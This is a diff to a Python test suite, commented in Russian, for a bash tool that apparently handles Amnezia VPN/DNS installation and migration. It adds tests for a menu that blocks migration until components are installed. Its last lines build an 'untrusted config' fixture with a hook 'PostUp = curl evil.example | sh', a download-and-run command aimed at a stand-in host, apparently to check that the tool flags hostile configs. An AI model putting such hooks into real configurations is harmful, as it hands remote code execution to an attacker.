@@ -166,6 +166,15 @@ with open(os.path.join(DKR, "names"), "a") as f:
 d = scan()
 chk("рядом AmneziaDNS — предупреждение, что он остаётся", any("AmneziaDNS" in w for w in d.get("warnings", [])), d.get("warnings"))
 
+print("\nМеню: не хватает компонентов")
+NOCOMP = PRE + "amnezia_blockers() { [[ -e $STATE_DIR/comp_ok ]] || echo components; }; amnezia_migrate() { echo MIGRATE; }; "
+rc, out, err = bash(NOCOMP + "do_install() { echo INSTALL; }; do_amnezia_menu", stdin="no\n")
+chk("блокер — без «yes» на перенос: отказ от установки — выход", "установи компоненты" in out
+    and "INSTALL" not in out and "MIGRATE" not in out, out + err)
+rc, out, err = bash(NOCOMP + 'do_install() { echo INSTALL; touch "$STATE_DIR/comp_ok"; }; do_amnezia_menu', stdin="yes\nyes\n")
+chk("после установки — снова сводка и перенос", out.count("INSTALL") == 1 and out.endswith("MIGRATE\n"), out + err)
+bash('rm -f "$STATE_DIR/comp_ok"')
+
 print("\nНедоверенный конфиг")
 reset()
 container(conf=amn_conf(extra_iface="PostUp = curl evil.example | sh\nPreUp = id\nTable = off\n"))
